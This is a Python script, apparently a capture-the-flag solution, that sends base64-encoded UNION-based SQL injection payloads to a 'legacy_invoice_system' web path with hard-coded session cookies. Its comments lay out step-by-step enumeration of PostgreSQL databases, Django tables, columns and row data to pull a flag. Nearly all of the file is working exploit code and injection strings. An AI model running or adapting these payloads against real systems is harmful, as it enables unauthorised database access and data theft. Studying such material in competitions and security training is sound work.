#!/usr/bin/env python

import requests
import base64

# Credit to @nc for the help with his mad python skills in developing this script using the requests python library 

# error received = not enough values to unpack (expected 7, got 1) * means it requires 7 inputs/columns to match the union

# REFERENCE - https://cobalt.io/blog/a-pentesters-guide-to-sql-injection-sqli

# -- Testing
# sql = b"blah-2021-11-27"
# sql = b"blah' or username like '%CSR%' or '1'='1-2021-11-30' union select '1','','3','4','5','6','2021-11-21="
# sql = b"blah' or '1'='1-2011-11-22' or username like '%dudedoesntexist%' union select 1111, 'col2','col3', 35,'col5','col6','2011-11-21' -- -"
# sql = b"blah' or '1'='1-2011-11-22' or username like '%dudedoesntexist%' union SELECT 1, datname ,'col3', 35,'email5','card number6','2011-11-21' FROM pg_database -- " 

# -- Enums the database names. Change the the OFFSET variable 0=template0, 1=postgres, 2=template1   
# sql = b" blah' or '1'='1-2011-11-22' union SELECT 1, datname ,'col3', 35,'email5','cardnumber6','2011-11-21' FROM pg_database LIMIT 1 OFFSET 2-- "

# -- Enumerate the tables by changing OFFSET variable 
# OFFSET 0=auth_group, 1=django_admin_log, 2=auth_group_permissions, 3=auth_user_user_permissions, 4=news_article, 5=django_content_type, 6=django_migrations, 7=auth_user_groups, 8=auth_permission, 9=auth_user, 10=news_subscriber
# sql = b"blah' or '1'='1-2011-11-22' union SELECT 1, table_name,'col3', 35,'email5','cardnumber6','2011-11-21' FROM information_schema.tables WHERE table_schema = 'public' LIMIT 1 OFFSET 10 -- -"

# -- Enum Table columns
# OFFSET 0=headline, 1=publish_time, 2=text, 3=id, 4=
# sql = b"blah' or '1'='1-2011-11-22' or username like '%burpguy%' union SELECT 1, column_name,'col3', 35,'email5','cardnumber6','2011-11-21' FROM information_schema.columns WHERE table_name = 'news_article' LIMIT 1 OFFSET 4 -- -"

# -- Pull data from id column. cast id column as text to avoid character type errors. enum proves 4 rows of data.
# OFFSET 0=3, 1=2, 2=1, 3=4, 4=
# sql = b"blah' or '1'='1-2011-11-22' or username like '%burpguy%' union SELECT 1, id::text, 'col3', 35,'email5','cardnumber6','2011-11-21' FROM news_article LIMIT 1 OFFSET 4 -- -"

# -- Pull data from text column
# OFFSET 0= the flag 
# sql = b"blah' or '1'='1-2011-11-22' or username like '%burpguy%' union SELECT 1, text, 'col3', 35,'email5','cardnumber6','2011-11-21' FROM news_article LIMIT 1 OFFSET 0 -- -"
sql = b"blah' or '1'='1-2011-11-22' union SELECT 1, text, 'col3', 35,'email5','cardnumber6','2011-11-21' FROM news_article LIMIT 1 OFFSET 0 -- -"

url = 'http://ssj.rumble.host/legacy_invoice_system/'

s = requests.session()
encoded_sql = base64.b64encode(sql)
url = f"{url}{encoded_sql.decode()}"

print("***** Starting *****")
cookies = {
    "csrftoken": 'ihbOJ5aMLfN7o6Pz5LtIUqUEuqLULpiqLAQ4nb8jznFKZiel4A8z4aDjDkkncVc3',
    "sessionid": 'pbekrqzce9czb34si6liuq43t6whvbdu'
}
headers = {
    "Host": "ssj.rumble.host",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Referer": "http://ssj.rumble.host/profile"
}
r = s.get(url, headers=headers, cookies=cookies)
print(r.text)
print(url)
print("---- Done -----")